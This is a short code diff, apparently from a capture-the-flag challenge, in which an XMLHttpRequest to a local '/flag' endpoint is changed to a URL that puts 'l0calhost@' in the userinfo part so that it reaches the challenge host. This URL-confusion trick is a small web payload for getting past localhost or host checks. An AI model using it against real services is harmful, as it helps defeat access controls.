@@ -12,7 +12,7 @@
     function get_page_info(){
         document.getElementById('test').innerHTML = "justfortest";
         var xhttp = new XMLHttpRequest();
-        xhttp.open("get", "http://127.0.0.1/flag",true); 
+        xhttp.open("get", "http://l0calhost@blackhat4-a90cb6d84e9055435b7a5db40e24a343-0.chals.bh.ctf.sa/flag",true); 
         xhttp.onreadystatechange = function() {
         if (this.readyState == 4) {
             document.getElementById('respose').innerHTML = this.status;
